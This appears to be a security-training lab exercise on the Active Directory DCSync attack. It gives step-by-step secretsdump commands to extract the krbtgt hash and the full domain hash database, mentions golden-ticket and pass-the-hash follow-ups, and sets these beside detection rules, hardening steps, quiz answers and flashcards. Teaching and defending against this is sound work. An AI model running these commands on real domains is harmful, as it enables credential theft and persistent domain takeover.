    Exercise 5.2: DCSync

    Before You Begin

    Domain Controllers replicate with each other using the Directory Replication Service Remote Protocol (DRSUAPI). One side asks "send me your changes since this version"; the other side responds with the requested objects, including their secrets (NT hashes, AES keys, supplemental credentials). Any user granted the two extended rights DS-Replication-Get-Changes and DS-Replication-Get-Changes-All can speak this protocol; regardless of whether they are a DC. The flag combination is called "DCSync rights" and the resulting attack pattern is called DCSync.

    DCSync is the canonical "extract everyone's hash" technique. Domain Admins have it by default. So do Enterprise Admins, Domain Controllers (the group), and historically anyone the administrator chose to grant it to (Azure AD Connect, Microsoft Identity Manager, third-party identity sync products).

    Exercise 5.2 gives you an account that has DCSync rights and asks you to extract krbtgt.

    Tools required: impacket-secretsdump. Pre-installed on Kali.

    Scenario

    Marcus Bell: "DCSync is the same protocol DCs use to replicate with each other. If a user has Replicating Directory Changes plus Replicating Directory Changes All, they speak that protocol whether they are a DC or not."

    The flag is sha256(krbtgt_NT_hash + scope_token) wrapped in OCR{...}.

    Credentials:

    Username Password Source

    Where DCSync Rights Come From

    The two extended rights surface on a small set of principals by design and on more principals by misconfiguration. The table below tells you who to expect on a baseline domain.

    Principal Expected? Why
    Domain Admins yes Default grant on domain root
    Enterprise Admins yes Default grant on domain root
    BUILTIN\Administrators yes Default grant on domain root
    Domain Controllers group yes DCs replicate with each other
    Azure AD / Entra Connect service account yes (if configured) Password Hash Sync requires it
    Microsoft Identity Manager service yes (if configured) Identity sync requires it
    Backup software service account usually no Almost always abuse path
    "Service account that needed extra rights" no Misconfiguration; treat as finding

    Background: The Two Extended Rights

    DCSync requires two rights on the domain object:

    Right GUID What it allows
    DS-Replication-Get-Changes 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 Receive replication changes (basic attributes)
    DS-Replication-Get-Changes-All 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 Receive replication changes including secrets

    The "All" variant is the one that exposes secrets. Without it the attacker still gets a lot, but not the hashes that make DCSync useful. With both, the attacker calls DRSGetNCChanges and gets every requested object's secret in the response. impacket's secretsdump.py automates the call and parses the response.

    Granted-by-default to: - BUILTIN\Administrators - Domain Admins - Enterprise Admins - Domain Controllers group

    Granted by intentional misconfiguration: - Azure AD Connect / Entra Connect (legitimate need) - Microsoft Identity Manager (legitimate need) - Backup software accounts (sometimes legitimate; usually not) - "Service accounts that needed extra rights" (almost always abuse path)

    The defender control is to enumerate every principal with these two rights and verify each one is intentional. PingCastle reports them. BloodHound shows them as DCSync edges. The query:

    MATCH (n)-[:DCSync]->(d:Domain) RETURN n

    The graph view renders the principal nodes that have DCSync rights; switch to the Table view tab and RETURN n.name, d.name for a list of principal+domain pairs.

    Any non-Tier-0 result is a finding.

    Detection: event 4662

    When DRSUAPI is invoked, the DC logs event 4662 (Directory Service Access) with the GUID of the right being exercised. Filter for 1131f6aa or 1131f6ad in event 4662; non-DC sources of those events are immediate alerts. Most SOCs do not have this rule by default; turning it on catches DCSync attacks reliably.

    What secretsdump dumps

    By default, secretsdump.py against a DC returns: - NT hash of every domain user - LM hash (usually empty on modern domains) - Kerberos keys (DES, AES128, AES256) - Supplemental credentials (clear-text passwords if Store password using reversible encryption is set; rarely used) - Cached credentials (CACHED_DOMAIN_LOGON_INFO from the local SAM/LSA; not via DRSUAPI but via the same call chain) - Computer account hashes (every machine secret)

    For this exercise we want only krbtgt. The -just-dc-user krbtgt flag tells secretsdump to use targeted DRSGetNCChanges rather than dumping the entire ntds. Faster, quieter, and yields the exact value we need.

    Tool Primer

    secretsdump targeted user

    secretsdump.py -just-dc-user krbtgt \
  corp.nordport.local/svc_dcsync_<token>:'<password>' \
  -dc-ip <dc_ip>

    Output:

    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<32-hex-char NT hash>:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:<aes256-key>
krbtgt:aes128-cts-hmac-sha1-96:<aes128-key>

    The aad3b435b51404eeaad3b435b51404ee LM hash is the canonical "empty LM" sentinel; ignore it. The 32-char NT hash after the third colon is what you want.

    Compute the flag

    NTHASH='<32 hex chars from secretsdump>'
TOKEN="${OCR_SCOPE_TOKEN}"
SHA=$(echo -n "${NTHASH}${TOKEN}" | sha256sum | awk '{print $1}')
echo "OCR{${SHA}}"

    Walkthrough

    Step 1: Validate the Account

    Confirm the credential before exercising the rights. A failed authentication here saves you from chasing a permission error in Step 2 (which can look identical to a misconfigured DCSync grant).

    Kali - Confirm svc_dcsync_ works

    netexec smb corp-dc01 \
  -u "svc_dcsync_${OCR_SCOPE_TOKEN}" -p '<password>' \
  -d corp.nordport.local
    Token Effect
    smb corp-dc01 SMB module against the DC.
    -u <user> -p <pw> Domain credential.
    -d <domain> Domain to authenticate against (DCSync rights live on the domain object).

    [+] confirms. [-] STATUS_LOGON_FAILURE means the password is wrong; [+] followed by (Pwn3d!) would mean the account is also a local admin on the DC, which is over-privileged for this scenario.

    Step 2: Extract krbtgt

    secretsdump.py -just-dc-user krbtgt opens a DRSUAPI bind to the DC and calls DRSGetNCChanges requesting only the krbtgt object's secrets. The DC checks the caller's effective rights on the domain object; the two replication ACEs permit the call. The response includes the NT hash, the AES128/256 keys, and any supplemental credentials.

    Kali - secretsdump targeted dump

    secretsdump.py -just-dc-user krbtgt \
  "corp.nordport.local/svc_dcsync_${OCR_SCOPE_TOKEN}:<password>" \
  -dc-ip <dc_ip>
    Flag Effect
    -just-dc-user <user> Targeted DRSGetNCChanges for one user. Faster + quieter than -just-dc.
    <realm>/<user>:<pw> Authentication string (impacket format).
    -dc-ip <ip> DC IP.

    The output line of interest:

    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::

    Field decoding (colon-separated): username:RID:LM_hash:NT_hash:::. The aad3b435b51404eeaad3b435b51404ee is the canonical "empty LM" sentinel; ignore it. The 32-hex-char value after the third colon is what you want. The lines after the user line list the Kerberos AES keys (use those for golden ticket forgery in Exercise 5.4).

    Step 3: Compute the Flag

    The flag is sha256(NT_hash + scope_token) to bind your submission to your token. The echo -n is critical: a trailing newline would change the SHA output.

    Kali - SHA-256 the hash + token

    NTHASH='<paste the 32-hex-char NT hash here>'
TOKEN="${OCR_SCOPE_TOKEN}"
SHA=$(echo -n "${NTHASH}${TOKEN}" | sha256sum | awk '{print $1}')
echo "OCR{${SHA}}"
    Token Effect
    echo -n No trailing newline. Critical for hash reproducibility.
    sha256sum SHA-256 the input; output is <hash> -.
    awk '{print $1}' Print only the hash, not the trailing -.

    Submit the OCR{...} value on the platform.

    Step 4: Note What Else You Could Have Dumped

    In a real engagement you would dump everything:

    secretsdump.py -just-dc \
  "corp.nordport.local/svc_dcsync_${OCR_SCOPE_TOKEN}:<password>" \
  -dc-ip <dc_ip> -outputfile dump

    dump.ntds would contain every user's hash. From that you can pass-the-hash to anyone, crack offline against rockyou, or forge silver tickets for any service account. The exercise restricts to krbtgt to keep the deliverable focused; the underlying capability is much broader.

    Common gotchas

    • STATUS_DRSUAPI_REQUIRED: the account does not have the two replication rights on the domain object. Confirm the grant is current with dsacls "DC=corp,DC=nordport,DC=local" | grep svc_dcsync.
    • DRSUAPI bind failure: secretsdump tries SMB pipe first, then falls back to TCP; some DC firewalls block direct DRSUAPI port. --use-vss is a different-syntax workaround using volume shadow copy (requires SMB admin on the DC).
    • Targeting wrong DC: in multi-DC environments the krbtgt hash is the same everywhere (replication keeps it in sync), but a stale read replica may take minutes to converge after a krbtgt rotation. Re-pull from the PDC if the hash looks suspiciously identical to a known-old value.
    • Trailing newline in SHA: every other shell pipeline trims newlines, but echo (without -n) adds one. Forgetting -n produces a different SHA than the platform expects; the flag is rejected.
    • Hash case: secretsdump prints lowercase hex. The platform accepts case-insensitively, but if you copy-paste into a separate hash tool that is case-sensitive (rare but exists), normalize to lower.

    Blue Team Perspective

    The detection signal lives in event 4662 with the right GUIDs and a non-DC source. Properly configured, this is one of the highest-signal alerts in any AD environment.

    Activity Event ID Field giveaway
    DRSUAPI replication call 4662 Properties contains 1131f6aa or 1131f6ad
    DRSUAPI from non-DC source 4662 + 4624 source IP not on DC list
    Defender for Identity "Suspected DCSync attack (replication of directory services)" MDI
    Bulk NTDS replication many 4662 events in seconds DC Security log

    Configuring the SACL for detection

    Default audit policies do not log every 4662; you must add a SACL on the domain object that audits the two replication GUIDs. Once configured, alert on any 4662 with those GUIDs whose source IP is not in the DC list. Cardinality is near zero in normal operation; signal is very high. MDI configures the SACL automatically.

    Hardening Note

    DCSync rights are intentional on a small set of principals and rare to need beyond that. The list below is the realistic audit and hardening menu.

    DCSync hardening

    • Run dsacls "DC=corp,DC=nordport,DC=local" \| findstr /i replicat quarterly. Every principal returned is either on the expected list or a finding.
    • BloodHound: MATCH (n)-[:DCSync]->(d:Domain) RETURN n.name. Any non-Tier-0 result is a finding.
    • Move AD Connect / Entra Connect to a Tier-0-classified server with full DC-equivalent monitoring.
    • Configure SACL audit on domain object for the two replication GUIDs; forward to SIEM.
    • Plan and execute a krbtgt double rotation every 6-12 months.
    • Enable Defender for Identity for built-in DCSync detection.

    Analysis Questions

    1. The DS-Replication-Get-Changes-All right is granted to Azure AD Connect by design. What is the operational risk of that, and how should it be managed?

    Reveal Answer

    Azure AD Connect (now Entra Connect) needs to read every user's password hash to compute the Azure AD password hash sync (PHS) value. The legitimate setup grants the AD Connect service account both DCSync rights on the domain root. The risk: a compromise of the AD Connect service account is a domain-wide credential compromise. Defender controls: (a) install AD Connect on a Tier-0 server, treated as a DC for security purposes; (b) rotate the AD Connect service account password regularly and monitor for use from non-AD-Connect sources; (c) monitor event 4662 for the two replication GUIDs and alert on any source that is not the AD Connect server; (d) consider Pass-Through Authentication (PTA) instead of PHS for environments where the synchronized hashes are not strictly needed. The risk is intrinsic to the architecture; the management is operational discipline.

    2. The exercise pulls only krbtgt. Why is krbtgt the highest-value target inside ntds, and what does possession of its hash enable?

    Reveal Answer

    krbtgt is the account that encrypts every TGT in the domain. Its NT hash (or AES key) is the "domain master key" for Kerberos. Possession of krbtgt's hash lets you forge TGTs for any user (golden tickets). Forged TGTs are accepted by every DC and every Kerberos-aware service in the domain because the krbtgt hash is the authentication root of trust. The forgery is undetectable in the tickets themselves: a forged TGT looks like any other valid TGT. The only way to invalidate forged tickets is to rotate krbtgt's password twice (the second rotation discards the previous password, invalidating tickets encrypted with the old key). Most organizations have never rotated krbtgt; a single DCSync of krbtgt yields persistent domain-wide impersonation that survives any user password change.

    3. The defender alert is event 4662 with the replication GUIDs from a non-DC source. Why is this not a default alert in most SIEMs?

    Reveal Answer

    Event 4662 (Directory Service Access) fires for many directory operations beyond just replication: any object access at the directory layer with auditing enabled. The default Windows audit policy logs 4662 for some operations but not all; turning on full Object Access auditing produces enormous volume (tens of thousands of events per hour on a busy DC). To make replication-specific alerting practical, defenders need to: (a) enable auditing for the specific GUIDs only (auditpol /set with a custom SACL on the domain object), or (b) use a SIEM rule that filters 4662 by the GUID property. Most SIEMs do not ship with this rule pre-built because it requires the customer to also configure the SACL on the domain object. Microsoft Defender for Identity does this automatically and alerts on suspicious DCSync; it is the easiest path for defenders who do not want to build custom rules.

    Key Takeaways

    • DCSync needs two rights: DS-Replication-Get-Changes and DS-Replication-Get-Changes-All.
    • secretsdump.py -just-dc-user <user> performs a targeted DRSGetNCChanges call.
    • krbtgt is the domain master key; one DCSync = persistent domain compromise.
    • Detection: event 4662 with the replication GUIDs from non-DC sources.
    • BloodHound shows DCSync paths as DCSync edges; PingCastle and dsacls audit the right grants.

    Cheat Sheet Recap

    The four operations below cover discovery, surgical extraction, and the full domain dump. Use the targeted variant unless you genuinely need everything.

    Goal Command
    Find DCSync principals (BloodHound) Cypher: MATCH (n)-[:DCSync]->(d:Domain) RETURN n.name, d.name
    Targeted: pull krbtgt only secretsdump.py -just-dc-user krbtgt "<domain>/<u>:<pw>" -dc-ip <dc>
    Targeted: any specific user secretsdump.py -just-dc-user "<USER>" "<domain>/<u>:<pw>" -dc-ip <dc>
    Full domain hash dump secretsdump.py -just-dc "<domain>/<u>:<pw>" -dc-ip <dc> -outputfile dump

    Card 1: secretsdump Targeted

    Q: Pull only krbtgt's hash from corp.local DC 10.10.10.10 using account svc_x:Pass#.

    Answer 
    secretsdump.py -just-dc-user krbtgt \
  "corp.local/svc_x:Pass#" \
  -dc-ip 10.10.10.10

    Output line: krbtgt:502:aad3b...:NT_HASH:::. The aad3b... is empty LM. The 32 chars after the third colon are your NT hash.

    Card 2: DCSync Right GUIDs

    Q: Name the two extended right GUIDs that together enable DCSync.

    Answer

    1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes) and 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All). Both are required; the "All" variant is the one that exposes secrets. Granted on the domain object by default to Domain Admins, Enterprise Admins, BUILTIN\Administrators, and the Domain Controllers group.

    Card 3: Why krbtgt Is the Master Key

    Q: Possession of krbtgt's NT hash enables what attack, and why does rotating user passwords not invalidate the tickets it forges?**

    Answer

    Golden ticket forgery: forge a TGT for any user with any group membership claims; every DC accepts the forged TGT as authentic because krbtgt's hash is what encrypts every legitimate TGT. User password rotations do not affect krbtgt; the only way to invalidate forged tickets is to rotate krbtgt twice (twice because the previous-and-current password are both honored briefly, and one rotation leaves a window for old-key tickets). Most environments have never rotated krbtgt, so a single DCSync persists indefinitely.

    Card 4: Detection Event

    Q: What Windows event ID + GUID combination indicates DCSync, and what additional configuration is needed for the event to fire?

    Answer

    Event 4662 (Directory Service Access) with Properties containing GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 or 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2. To make it fire reliably, the domain object's SACL must include audit ACEs for those rights. Default audit policies often miss this; the explicit configuration is required. Defender for Identity adds the SACL automatically.

    Card 5: Why You Want Just-DC Variants

    Q: Compare secretsdump.py -just-dc vs secretsdump.py (no flag). When do you use each?

    Answer

    -just-dc (and -just-dc-user, -just-dc-ntlm) use DRSUAPI to pull only the requested data, no SAM/LSA dump. Faster, quieter, and works against any reachable DC. Plain secretsdump.py (no flag) ALSO performs an LSA secrets dump from the host you are authenticating as, which requires admin on that host and is loud. Use -just-dc-user krbtgt for surgical extraction. Use -just-dc for the full domain hash dump. Use plain secretsdump.py target only when you also want LSA secrets from the target host (cached domain logon info, machine secret, etc.).
